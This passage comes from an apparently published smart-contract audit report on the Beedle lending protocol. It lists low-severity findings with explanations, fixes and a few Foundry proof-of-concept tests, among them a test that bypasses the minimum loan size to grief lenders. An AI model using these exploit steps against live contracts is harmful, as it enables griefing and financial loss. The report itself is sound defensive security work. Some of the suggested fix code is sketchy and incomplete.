    // [FAIL. Reason: Index out of bounds] test_giveLoanDifferentLength()
}
```

```bash
forge test --match-test giveLoanDifferentLength -vvvv
```

### **How to fix**

```diff
function giveLoan(
    uint256[] calldata loanIds,
    bytes32[] calldata poolIds
) external {
+   if (loanIds.length != poolIds.length) revert GiveLoanLengthMismatch();
    for (uint256 i = 0; i < loanIds.length; i++) {
        uint256 loanId = loanIds[i];
        bytes32 poolId = poolIds[i];
        ...
    }
}
```
## <a id='L-03'></a>L-03. Missing Events Emitting

_Submitted by [tpwn](https://profiles.cyfrin.io/u/undefined), [nmirchev8](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [kamuik16](https://profiles.cyfrin.io/u/undefined), [0xl3xx](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [auditism](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [timenov](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [blockchainbard](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [alexzoid](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [UrosZigic](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined), [crypt0mate](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined). Selected submission by: [leasowillow](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L84

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L92

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L100

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L53

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L61

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L80

## Summary

There are functions in the contracts that do not emit events on the important state changes.

## Impact

This violates the best practices and disallows to track the state changes off-chain.

## Tools Used

Manual review

## Recommendations

Emit events on state variables updates.
## <a id='L-04'></a>L-04. Wrong Amount of Loan Interest is Calculated

_Submitted by [rhaosec](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [0xdice91](https://profiles.cyfrin.io/u/undefined), [No12Samurai](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined). Selected submission by: [No12Samurai](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L720-L727

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Structs.sol#L34-L55

### Summary

The vulnerability involves miscalculating interest rates in a lending protocol's codebase. The code mistakenly treats the `interestRate` meant for per-second calculations as if it's per-year. This results in underestimated interest due to incorrect division by 365 days. The impact is illustrated with a $10,000 loan for a year: correct interest should be $31,536,000, but the flawed code yields $1. Precision loss also arises from omitting 6 hours in a year. Additionally, using 3 decimals for interest rates compounds precision issues. Corrective actions involve adjusting calculations based on intended time units.

### Vulnerability Details

In the `Structs.sol#L48` the `interestRate` variable is defined. The comment mentions its explanation below:
> /// @notice the interest rate of the loan per second (in debt tokens)

Then, the `interestRate` variable is used in the `_calculateInterest()` function in `Lender.sol#L720-L727` as below:

```solidity
function _calculateInterest(
      Loan memory l
   ) internal view returns (uint256 interest, uint256 fees) {
      uint256 timeElapsed = block.timestamp - l.startTimestamp;
      interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;
      fees = (lenderFee * interest) / 10000;
      interest -= fees;
   }
```

We can see that for calculating the interest, the `interestRate` which shows the interest rate of the loan per second is divided by `365 days`. Since the `interestRate` variable is multiplied by `timeElapsed` which is in seconds and divided by `365 days`, means that the `interestRate` variable is considered to show the interest Rate per 365 days.

We know that the `interestRate` shows the interest rate of a loan per second. Also, we know that 365 days have 31,536,000 seconds. So, the interest rate per 365 days should be 31,536,000 times more than the interest rate per second. However, in the given code, both interest rate per second and interest rate per 365 days, are used interchangeably.

Also, note that 1 year is equal to 365 days and 6 hours. A lack of 6 hours in the computation can lead to precision loss.

The final note regarding calculating the interest is that 3 decimals is way small and can lead to precision loss easily.

### Impact

This can lead to a huge underestimation of the interest on a loan. Consider the interest rate per second is $10^{-4}$. Consider three decimals considered for `interestRate`, this value should be equal to one. Consider there is a loan with the value of \$10,000, which has been given to the borrower for 365 days. Hence, the total interest is:

$$
\text{interest} = 1 \times 10,000 \times 31,536,000 / 10,000 = 31,536,000
$$

We can see the interest of this loan must be $31,536,000 for 365 days. However, the implementation calculates the interest like below:

$$
\text{interest} = 1 \times 10,000 \times 31,536,000 / 10,000 / 31,536,000  = 1
$$

A huge difference can be observed here.

Regarding the second case, consider that 1 year is 365 days and 6 hours. Consider we are calculating the interest using the implementation but with the correct period for a year. In this case, the interest would be:

$$
\text{interest} = 1 \times 10,000 \times 31,536,000 / 10,000 / (31,536,000 + 21,600)  = 0
$$

Since the result should be an integer, we can see adding the exact time of a year can make the interest zero instead of one.

### Tools Used

   Manual Review, Foundry

### Recommendations

In case of using the `interest` variable for showing interest per second; change the `Lender.sol#L724` to the following:

```solidity
interest = (l.interestRate * l.debt * timeElapsed) / 10000;
```

In case of using the `interest` variable for showing interest per year; change the `Lender.sol#L724` to the following:

```solidity
interest = (l.interestRate * l.debt * timeElapsed) / 10000 / (365 days + 6 hour); 
```

## <a id='L-05'></a>L-05. Amount != 0 checks are missing

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [samshz](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [pina](https://profiles.cyfrin.io/u/undefined), [ericselvig](https://profiles.cyfrin.io/u/undefined), [aamirusmani1552](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined). Selected submission by: [aamirusmani1552](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol

## Summary
No check for parameter `_amount` zero is done at some places.

## Vulnerability Details
In `Beedle.sol`s functions `mint`, `_burn`, `_mint`, the check for `_amount` zero is not done. That means users will be able to run the functions passing `_amount` as zero.

In `Staking.sol`s functions `deposit` and `withdraw` the check for `_amount` zero is not done as well.

There are five instances of this in the contract: 
[[1](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L36)]
[[2](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L29)]
[[3](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L22)]
[[4](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L38)]
[[5](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L46)]

example: [[example](https://github.com/Aamirusmani1552/beedle/blob/0fbca7f602374935139e915e9b919f6c5b7011f0/test/Beedle.t.sol#L14)]

## Impact
Users will be able to run the functions successfully and no there would be unnecessary gas cost. And also state update will cost gas.

## Tools Used
Manual Inspection, Foundry tests

## Recommendations
Consider checking if `_amount` is zero or not in the beginning of the function.
## <a id='L-06'></a>L-06. Possible incorrect borrowing timestamps 

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [touqeershah32](https://profiles.cyfrin.io/u/undefined). Selected submission by: [daniel526](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L276-L287

## Summary
The smart contract function `borrow` allows users to borrow loans from a pool. However, the function's dependency on the `block.timestamp` for recording the borrowing timestamp introduces a vulnerability. Malicious miners could potentially manipulate the `block.timestamp`, leading to inaccuracies in the recorded borrowing timestamps. This can have implications for time-sensitive operations such as interest calculations, time-based auctions, and loan durations.
## Vulnerability Details
```solidity
Loan memory loan = Loan({
    // ...
    startTimestamp: block.timestamp, // Borrowing timestamp is recorded here
    // ...
});
```
The `block.timestamp` represents the time at which the block is mined and is determined by the miner. Although Ethereum has mechanisms in place to prevent blatant timestamp manipulation, miners still have some degree of control over the block timestamp within certain limits, known as "block time drift." This drift allows miners to adjust the timestamp by a small range, which introduces a possibility of timestamp manipulation.
## Impact
The timestamp manipulation vulnerability can lead to incorrect borrowing timestamps being recorded in the smart contract. As a result, time-sensitive operations, such as calculating interest based on loan start times, determining loan durations, and initiating time-based auctions, can be affected. Inaccurate timestamps may lead to incorrect interest calculations, unintended loan durations, and potential financial losses for both lenders and borrowers.
## Tools Used
Manual
## Recommendations
Using `block.number`, which represents the current block number in the Ethereum blockchain, in combination with `block.timestamp`, can add an additional layer of security. By incorporating `block.number`, the smart contract can reduce the risk of timestamp manipulation while still ensuring that the recorded timestamp remains close to the actual time the transaction is mined.
```solidity
// Import the oracle contract or interface here

function borrow(Borrow[] calldata borrows) public {
    for (uint256 i = 0; i < borrows.length; i++) {
        // ...
        uint256 currentBlockNumber = block.number;
        uint256 externalTimestamp = // Fetch the timestamp from a trusted external oracle here
        require(externalTimestamp >= block.timestamp, "Invalid timestamp"); // Ensuring the external timestamp is not in the past
        require(externalTimestamp <= block.timestamp.add(maxTimestampDrift), "Invalid timestamp"); // Allowing for a maximum timestamp drift

        // Use a combination of block.timestamp and block.number for the startTimestamp
        uint256 actualTimestamp = externalTimestamp.add(currentBlockNumber.sub(startBlockNumber).mul(blockTime));
        Loan memory loan = Loan({
            // ...
            startTimestamp: actualTimestamp, // Using the combined timestamp
            // ...
        });
        // ...
    }
}
```
In this example, `block.number` is used to calculate the drift in block time since the transaction was mined. This is done by storing the `block.number` at the start of the transaction in `startBlockNumber` and calculating the number of blocks that have elapsed since then.

Additionally, `maxTimestampDrift` is used to specify the maximum allowed drift in the externally fetched timestamp. The contract ensures that the externally fetched timestamp is within an acceptable range from the actual transaction time by checking `externalTimestamp <= block.timestamp.add(maxTimestampDrift)`.

By combining `block.number` and `block.timestamp` in this manner, the smart contract can mitigate the risk of timestamp manipulation while still maintaining the ability to record an accurate and secure borrowing timestamp.
## <a id='L-07'></a>L-07. Griefing a lender with dust loans

_Submitted by [sonny2k](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
In [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465), there is no validation if the `totalDebt < pool.minLoanSize`. Therefore, a lender can be given a loan with very small loan which he doesn't want at all.

## Vulnerability Details
Since [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465) can be called by anyone, a malicious borrower can borrow a loan from his own pool with a pretty small `minLoanSize` so that he/she can self-borrow a small loan from his/her own pool, then forcefully push this loan by calling `buyLoan()` with his/her own loan to a random pool with enough pool balance of the pairs. Doing this cause griefing to the lender.

## POC
1. We mint the `loanToken` to `borrower` so that he can set up his pool in [setUp()](https://github.com/Cyfrin/2023-07-beedle/blob/main/test/Lender.t.sol#L35) function of `Lender.t.sol`
```diff
+        loanToken.mint(address(borrower), 100000 * 10 ** 18);
```
2. Paste this code into `Lender.t.sol`: https://github.com/Cyfrin/2023-07-beedle/blob/main/test/Lender.t.sol.
Right here the borrower set up his pool with very small `minLoanSize` of `1 * 10 ** 18` and borrow the loan himself/herself.
```
function test_borrowPoc() public {
        vm.startPrank(borrower);
        Pool memory p = Pool({
            lender: borrower,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 1 * 10 ** 18,
            poolBalance: 10 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);

        (, , , , uint256 poolBalance, , , , ) = lender.pools(poolId);
        assertEq(poolBalance, 10 * 10 ** 18);

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1 * 10 ** 18,
            collateral: 1 * 10 ** 18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);

        assertEq(collateralToken.balanceOf(address(lender)), 1 * 10 ** 18);
}
```
3. Paste this code into `Lender.t.sol`: https://github.com/Cyfrin/2023-07-beedle/blob/main/test/Lender.t.sol.
Right here the `borrower` starts the auction for his loan and call `buyLoan()` with the pool of `lender1`, which has the `minLoanSize` value of 100 * 10 ** 18. The test goes through successfully, meaning the loan is bought to the new pool.
```
function test_bypassMinLoanSize() public {
        test_borrowPoc();
        // accrue interest
        vm.warp(block.timestamp + 1 days);
        // kick off auction
        vm.startPrank(borrower);

        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        lender.startAuction(loanIds);

        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);

        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);

        vm.startPrank(borrower);

        lender.buyLoan(0, poolId);
}
```
Use `forge test --mt test_bypassMinLoanSize` to run this test case.

## Impact
> `minLoanSize` - the minimum loan size they are willing to take (this is to prevent griefing a lender with dust loans). Ref: **Contract Overview** - https://www.codehawks.com/contests/clkbo1fa20009jr08nyyf9wbx
1. The protocol declares a `minLoanSize` validation to address the above issue. However, the `buyLoan()` is missing this validation and allows an attacker to grief the lender.
2. The lender may accidentally buy a loan whose size is below his `minLoanSize`'s pool configs via [zapBuyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L540).

## Tools Used
Manual

## Recommendations
Consider implement a validation for min loan size like other functions in the contract after line [485](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L485).
```diff
485      uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
+        if (totalDebt < pool.minLoanSize) revert LoanTooSmall();
```
## <a id='L-08'></a>L-08. Staking contracts should be assert TKN != WETH

_Submitted by [kutu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L46-L50

## Summary

The staking contract is incompatible with the same address of TKN and WETH. So you should force them to be different address in the constructor, otherwise it will mess up the internal accounting system.

## Vulnerability Details

```solidity
    function claim() external {
        updateFor(msg.sender);
        WETH.transfer(msg.sender, claimable[msg.sender]);
        claimable[msg.sender] = 0;
        balance = WETH.balanceOf(address(this));
    }

    function update() public {
        uint256 totalSupply = TKN.balanceOf(address(this));
        if (totalSupply > 0) {
            uint256 _balance = WETH.balanceOf(address(this));
            if (_balance > balance) {
                uint256 _diff = _balance - balance;
                if (_diff > 0) {
                    uint256 _ratio = _diff * 1e18 / totalSupply;
                    if (_ratio > 0) {
                      index = index + _ratio;
                      balance = _balance;
                    }
                }
            }
        }
    }
```

The contract is not compatible with this situation such as the balance update in the claim function, totalSupply confuses the collateral and reward, which will disrupte internal accounting.

## Impact

Staking contracts is not compatible with the same TKN and WETH, which will disrupte internal accounting.

## Tools Used

Manual review

## Recommendations

Assert TKN != WETH
## <a id='L-09'></a>L-09. Operator can prevent customers from borrowing from a given pool

_Submitted by [qbs](https://profiles.cyfrin.io/u/undefined), [ohi0b](https://profiles.cyfrin.io/u/undefined), [ayeslick](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ayeslick](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L301

## Summary
When a customer tries to borrow from a pool, an operator can front-runs the transaction, borrowing a large sum, causing a liquidity shortage. The customer's borrow attempt will fail due to insufficient funds. The operator then backruns the failed transaction, repaying the loan. This prevents the customer from borrowing and prevents the lender from earning interest.

## Vulnerability Details
1. Customer attempts to borrow from a given pool. 
2. Operator front run’s customer and borrows a large amount of funds from pool 
3. Customers borrow fails because there isn’t enough liquidity in the pool to cover his loan
4. Operator backruns customers failed borrow transaction to repay the loan 

## Impact
DoS that prevent customers from taking out a loan and lenders from earning interest 

## Tools Used
manual

## Recommendations
Include a minimum interest fee if the loan duration is less than a certain time to discourage this behavior. 

## <a id='L-10'></a>L-10. Loan can be seized during an auction

_Submitted by [ZdravkoHr](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZdravkoHr](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L556

## Summary
Loans can be seized before the end of their auction.

## Vulnerability Details
The [**seizeLoan**](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L548) function allows users to seize a loan if an auction for them has failed. There is an [if statement](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L556C13-L556C13) that reverts the transaction if a trial to claim a loan before the end of its auction occurs. The condition will return true if **block.timestamp** is equal to the end of the auction. 

This may seem like intended, but in [**buyLoan**](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L471) we can see that an auction is considered active until **block.timestamp** passes its end time.

## Impact

If an user who wants to buy a loan is backrunned in a block where the timestamp matches the end of the auction, he can end up buying a loan that gets seized by a malicious actor.

## Tools Used

Manual review

## Recommendations

Correct the check in **seizeLoan** to:

```solidity
if (block.timestamp <= loan.auctionStartTimestamp + loan.auctionLength) revert AuctionNotEnded();
```
## <a id='L-11'></a>L-11. Permanent staking reward dilution

_Submitted by [credence0x](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L62

## Summary
Staking rewards can be diluted by people who transfer staking tokens to the staking contract by any means other than by calling the `deposit` function.

## Vulnerability Details
Staking rewards can be diluted by people who transfer staking tokens to the staking contract by any means other than by calling the `deposit` function. e.g by calling the `token.transfer(address(staking), amount)` while never being able to claim rewards hence diluting the reward pool permanently. 

## Impact
Reward pool is diluted permanently

## Tools Used
My hunger for reward maximisation

## Recommendations
Add a new global storage variable (e.g uint public tknBalance) and update it whenever the `deposit` and `withdraw` functions are called. Then use it here (https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L62) for calculations
## <a id='L-12'></a>L-12. Emitting incorrect event parameters

_Submitted by [credence0x](https://profiles.cyfrin.io/u/undefined), [RugpullDetector](https://profiles.cyfrin.io/u/undefined), [khegeman](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L680-L681

## Summary

The `Lender::refinance()` emits incorrect event parameters.

## Vulnerability Details

The `refinance()` emits incorrect event parameters: `debt` and `collateral`.  Specifically, the `debt` and `collateral` variables in question contain amounts related to the new pool, not the previous pool.

```solidity
    function refinance(Refinance[] calldata refinances) public {
        for (uint256 i = 0; i < refinances.length; i++) {
            ...

            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
@>              debt,
@>              collateral,
                loan.interestRate,
                loan.startTimestamp
            );

            ...
        }
    }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L680-L681

## Impact

The incorrect event logs may cause off-chain services to malfunction.

## Tools Used

Manual Review

## Recommendations

Emit the `loan.debt` and `loan.collateral` variables instead to fix this issue.

```diff
    function refinance(Refinance[] calldata refinances) public {
        for (uint256 i = 0; i < refinances.length; i++) {
            ...

            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
-               debt,
-               collateral,
+               loan.debt,
+               loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );

            ...
        }
    }
```
## <a id='L-13'></a>L-13. Rounding error risk in borrow() function in Lender.sol

_Submitted by [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [Phantasmagoria](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [radeveth](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [Harut](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [samshz](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [Saskloch](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xscsamurai](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L265

## Summary
Rounding error risk in borrow() function in Lender.sol.

Affected line:

uint256 fees = (debt * borrowerFee) / 10000;

Since borrowerFee is currently set to 50, if the value of debt is <= 199, the computation will result in a rounding error

## Vulnerability Details

PoC:

debt = 199
borrowerFee = 50

uint256 fees = (debt * borrowerFee) / 10000 = (199 * 50) / 10000 = 9950 / 10000 = 0.995 = 0 (in solidity without any proper handling of fractional values)

## Impact
Zero fees.

RISK:
- feeReceiver wont receive the borrower fee
- borrower will receive the full debt amount, instead of (debt - fees) amount

## Tools Used
VSC, manual.

## Recommendations
- Import & use fixed-point arithmetic math libraries
- or implement fixed-point arithmetic (aka scaling factor) manually in each rounding error vulnerable statement
## <a id='L-14'></a>L-14. Staking tokens transfer to the staking contract will make a fraction of WETH rewards be lost forever

_Submitted by [lalanda](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L62

## Summary

If an amount of tokens are transferred directly into the stacking contract, instead of using the deposit() function, those tokens will be used for the calculation of rewards.

## Vulnerability Details

On Staking.sol for the calculation of rewards the balance of staking tokens of the contract is used. That means that not only tokens deposited with the function deposit() are considered. Transferred tokens, using ERC20 transfer() function are considered as well. 

It is possible to grief the rewards for the stakers being it in purpose or by mistake. It would be costly to the attacker, but since the issue is a easy fix, it is recommended that the amount of tokens stacked is obtained by a storage variable.

## Impact

A fraction of rewards will be lost on the staking contract, impossible to retrieve. 

## Tools Used

Manual Review

## Recommendations

Instead of using the ERC20 balance, use a storage variable to keep track of staked tokens.

    diff --git a/src/Staking.sol b/src/Staking.sol

    @@ -20,6 +20,9 @@ contract Staking is Ownable {
    
        /// @notice mapping of user balances
        mapping(address => uint256) public balances;
    +    
    +    uint256 public totalStakedBalances;
    +
        /// @notice mapping of user claimable rewards
        mapping(address => uint256) public claimable;
        
    @@ -28,6 +28,7 @@ contract Staking is Ownable {
        /// @notice the reward token
        IERC20 public immutable WETH;
    
        constructor(address _token, address _weth) Ownable(msg.sender) {
            TKN = IERC20(_token);
            WETH = IERC20(_weth);
    @@ -38,6 +43,7 @@ contract Staking is Ownable {
        function deposit(uint _amount) external {
            TKN.transferFrom(msg.sender, address(this), _amount);
            updateFor(msg.sender);
    +        totalStakedBalances += _amount;
            balances[msg.sender] += _amount;
        }
    
    @@ -46,6 +52,7 @@ contract Staking is Ownable {
        function withdraw(uint _amount) external {
            updateFor(msg.sender);
            balances[msg.sender] -= _amount;
    +        totalStakedBalances -= _amount;
            TKN.transfer(msg.sender, _amount);
        }
        
    @@ -56,10 +56,20 @@ contract Staking is Ownable {
            claimable[msg.sender] = 0;
            balance = WETH.balanceOf(address(this));
        }

        function update() public {
    -        uint256 totalSupply = TKN.balanceOf(address(this));
    +        uint256 totalSupply = totalStakedBalances;
            if (totalSupply > 0) {
                uint256 _balance = WETH.balanceOf(address(this));
                if (_balance > balance) {
## <a id='L-15'></a>L-15. Loss of precision in `Staking.updateFor()` will make user to lose claimable amount.

_Submitted by [RugpullDetector](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L87-L90


## Summary
Staking.updateFor() calculates claimable amount based on `_supplied * delta  / 1e18`.

It might cause precision loss but `supplyIndex` is updated.

## Vulnerability Details
Let's say `_supplied * _delta` is 0.999e18, newly claimable shares will be zero, but `supplyIndex` will be updated to current index. So there's no way to recover lost precision.

```solidity
    function updateFor(address recipient) public {
        update();
        uint256 _supplied = balances[recipient];
        if (_supplied > 0) {
            uint256 _supplyIndex = supplyIndex[recipient];
            supplyIndex[recipient] = index;
            uint256 _delta = index - _supplyIndex;
            if (_delta > 0) {
              uint256 _share = _supplied * _delta / 1e18;// @audit - precision loss
              claimable[recipient] += _share;
            }
        } else {
            supplyIndex[recipient] = index;
        }
    }
```

## Impact
If staking amount is small or `updateFor` is called frequently, user may lose staking reward because of precision loss.

## Tools Used
Manual Review

## Recommendations
It should divide by 1e18 in `claim()` not `updateFor`.

```solidity
    function claim() external {
        updateFor(msg.sender);
-       WETH.transfer(msg.sender, claimable[msg.sender]);
+       WETH.transfer(msg.sender, claimable[msg.sender] / 1e18);
        claimable[msg.sender] = 0;
        balance = WETH.balanceOf(address(this));
    }
```
```solidity
    function updateFor(address recipient) public {
        update();
        uint256 _supplied = balances[recipient];
        if (_supplied > 0) {
            uint256 _supplyIndex = supplyIndex[recipient];
            supplyIndex[recipient] = index;
            uint256 _delta = index - _supplyIndex;
            if (_delta > 0) {
-             uint256 _share = _supplied * _delta / 1e18;// @audit - precision loss
+             uint256 _share = _supplied * _delta;
              claimable[recipient] += _share; 
            }
        } else {
            supplyIndex[recipient] = index;
        }
    }
```
## <a id='L-16'></a>L-16. Event Based Reentrancy due to CallBack Tokens  

_Submitted by [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L277

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L333

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L405

## Summary
Callback functions that can reenter functions with events lead to Event Reentrancy 

## Vulnerability Details

1. event Borrowed emitted Lender.sol line 277 after external calls to transfer()... line 269 loanToken
2. event Repaid emitted Lender.sol line 333 after external calls to transfer collateral tokens to borrower lines 329
3. event Repaid emitted Lender.sol lines 405 after external calls to transfer() to feeReceiver lines 403 
If loanToken or collateralToken are callback tokens when transferred out they may be sent to a contract that can callback into the same function before the first event is emmitted. This results in wen function completes emitting incorrect or inconsistent event data as it will always miss emitting the first states, information, data that were suppposed to be emitted but was missed due to reentrancy

## Impact
Medium: This results in incorrect events and missed event emission information for offchain tooling, monitoring, analysis, front ends. Users may act on protocol on faulty information from these events 


## Tools Used
Manual Analysis 

## Recommendations
1. It is recommended to follow Checks Effects Interactions patterns CEI pattern to ensure state updates and events are emitted before external calls to ensure accurate information. Move the events above the transfers 

2. It may be ideal to make use of Reentrancy Guards e.g OpenZeppelin nonreentrant modifiers on affected functions

3. It may be ideal to whitelist allowed tokens for loanToken and collateralTokens and not allow callback, hook, tokens such as ERC777, ERC1363, 
## <a id='L-17'></a>L-17. Pausable Tokens 

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
